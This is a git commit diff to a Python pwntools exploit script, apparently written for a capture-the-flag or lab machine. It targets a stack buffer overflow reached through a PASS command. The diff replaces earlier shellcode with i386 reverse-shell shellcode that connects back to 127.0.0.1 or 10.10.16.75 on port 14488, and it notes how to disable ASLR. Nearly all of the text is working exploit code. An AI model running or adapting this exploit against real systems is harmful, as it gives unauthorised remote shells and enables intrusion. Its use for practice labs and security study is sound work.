5e38c6eceeda5e4a43bda9704bd5ef600cc9ebd7
kmahyyg <16604643+kmahyyg@users.noreply.github.com>
2019-09-17 01:49:35 +0000

    fix filename and enable name

--- jail-bof-7411-LOCALDEBUG.py
+++ jail-bof-7411-LOCALDEBUG.py
@@ -4,11 +4,11 @@
 # `sudo sysctl -w kernel.randomize_va_space=0` to disable ASLR
 # Ref: https://unix.stackexchange.com/questions/89211/
 # Ref: https://linux.die.net/man/8/execstack
-# Ref: http://shell-storm.org/shellcode/files/shellcode-881.php
+# Ref: http://shell-storm.org/shellcode/files/shellcode-833.php
 # Ref: https://stackoverflow.com/questions/38189169/
 # Ref: https://linux-audit.com/linux-aslr-and-kernelrandomize_va_space-setting/
 
-DEBUG_FLAG = False
+DEBUG_FLAG = True
 
 from pwn import *
 context(os="linux", arch="i386")
@@ -53,14 +53,22 @@ p2.recvline()  # 'OK Send PASS command.\n'
 # 0x90 == nop, 0xcc == int3
 msgbase = 'PASS '
 junk = "\x90" * 28
-
 shellc = ''
-shellc += '\x6a\x02\x5b\x6a\x29\x58\xcd\x80\x48\x89\xc6'
-shellc += '\x31\xc9\x56\x5b\x6a\x3f\x58\xcd\x80\x41\x80'
-shellc += '\xf9\x03\x75\xf5\x6a\x0b\x58\x99\x52\x31\xf6'
-shellc += '\x56\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e'
-shellc += '\x89\xe3\x31\xc9\xcd\x80'
+shellc += '\x68'
 
+if DEBUG_FLAG:
+    shellc += '\x7f\x01\x01\x01'  # <- IP Number "127.0.0.1"
+else:
+    shellc += '\x0a\x0a\x10\x4b'  # <- IP Number "10.10.16.75"
+
+shellc += '\x5e\x66\x68'
+shellc += '\x38\x98'          # <- Port Number "14488"
+shellc += '\x5f\x6a\x66\x58\x99\x6a\x01\x5b\x52\x53\x6a\x02'
+shellc += '\x89\xe1\xcd\x80\x93\x59\xb0\x3f\xcd\x80\x49\x79'
+shellc += '\xf9\xb0\x66\x56\x66\x57\x66\x6a\x02\x89\xe1\x6a'
+shellc += '\x10\x51\x53\x89\xe1\xcd\x80\xb0\x0b\x52\x68\x2f'
+shellc += '\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x53'
+shellc += '\xeb\xce'
 finalmsg = msgbase + junk + p32(leaked_addr + 32) + shellc
 
 p2.sendline(finalmsg)
